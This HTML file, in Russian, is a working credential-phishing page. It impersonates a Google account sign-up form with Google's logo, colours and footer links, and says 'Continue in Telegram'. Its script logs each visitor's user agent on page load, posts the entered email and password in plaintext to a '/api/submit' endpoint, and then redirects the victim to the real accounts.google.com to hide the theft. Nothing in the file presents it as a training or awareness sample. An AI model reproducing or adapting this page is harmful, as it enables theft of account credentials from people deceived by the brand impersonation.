<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация - Google</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Google Sans', 'Arial', sans-serif;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }
        
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .google-logo img {
            width: 75px;
            height: 24px;
        }
        
        .title {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }
        
        input {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        
        label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: white;
            padding: 0 5px;
            color: #5f6368;
            font-size: 16px;
            transition: all 0.2s;
            pointer-events: none;
        }
        
        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }
        
        .forgot-email {
            text-align: left;
            margin-bottom: 32px;
        }
        
        .forgot-email a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-email a:hover {
            text-decoration: underline;
        }
        
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
        }
        
        .footer {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .language {
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        
        .footer-links {
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            background-color: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google" onerror="this.style.display='none'">
        </div>
        
        <h1 class="title">Создайте аккаунт Google</h1>
        <p class="subtitle">Продолжите в Telegram</p>

        <form id="messageForm">
            <div class="form-group">
                <div class="input-group">
                    <input type="text" id="email" name="email" placeholder=" " required>
                    <label for="email">Введите почту</label>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password">Введите пароль</label>
                </div>
            </div>

            <div class="forgot-email">
                <a href="#">Войти вместо этого</a>
            </div>

            <div class="buttons">
                <a href="#" class="create-account">Создать аккаунт</a>
                <button type="submit" class="next-button">Далее</button>
            </div>
        </form>

        <div id="status"></div>

        <div class="footer">
            <div class="language">
                Русский
            </div>
            <div class="footer-links">
                <a href="#">Справка</a>
                <a href="#">Конфиденциальность</a>
                <a href="#">Условия</a>
            </div>
        </div>
    </div>

    <script>
        // Отслеживание при загрузке страницы
        document.addEventListener('DOMContentLoaded', function() {
            // Отправляем информацию о входе
            fetch('/api/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'Зашел на страницу регистрации',
                    userAgent: navigator.userAgent
                })
            }).catch(err => console.log('Track error:', err));

            // Обработка формы
            document.getElementById('messageForm').addEventListener('submit', async function(event) {
                event.preventDefault();

                const form = event.target;
                const formData = new FormData(form);
                const email = formData.get('email');
                const password = formData.get('password');
                const statusDiv = document.getElementById('status');
                const submitBtn = document.querySelector('.next-button');

                // Показываем загрузку
                statusDiv.style.display = 'block';
                statusDiv.className = 'loading';
                statusDiv.textContent = '⏳ Отправка данных...';
                submitBtn.disabled = true;

                try {
                    const response = await fetch('/api/submit', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            email: email, 
                            password: password 
                        })
                    });

                    const result = await response.json();

                    if (result.success) {
                        statusDiv.textContent = '✅ Данные отправлены! Перенаправление...';
                        statusDiv.className = 'success';
                        form.reset();
                        
                        // Перенаправление через 2 секунды
                        setTimeout(() => {
                            window.location.href = 'https://accounts.google.com';
                        }, 2000);
                    } else {
                        statusDiv.textContent = '❌ Ошибка: ' + (result.error || 'Неизвестная ошибка');
                        statusDiv.className = 'error';
                    }

                } catch (error) {
                    console.error('Ошибка:', error);
                    statusDiv.textContent = '❌ Ошибка сети';
                    statusDiv.className = 'error';
                }

                statusDiv.style.display = 'block';
                submitBtn.disabled = false;
            });
        });

        // Если логотип не загрузится, покажем текстовый вариант
        document.querySelector('.google-logo img').addEventListener('error', function() {
            this.style.display = 'none';
            const textLogo = document.createElement('div');
            textLogo.innerHTML = '<span style="color: #4285f4; font-size: 24px; font-weight: bold;">G</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">o</span><span style="color: #fbbc05; font-size: 24px; font-weight: bold;">o</span><span style="color: #4285f4; font-size: 24px; font-weight: bold;">g</span><span style="color: #34a853; font-size: 24px; font-weight: bold;">l</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">e</span>';
            document.querySelector('.google-logo').appendChild(textLogo);
        });
    </script>
</body>
</html>
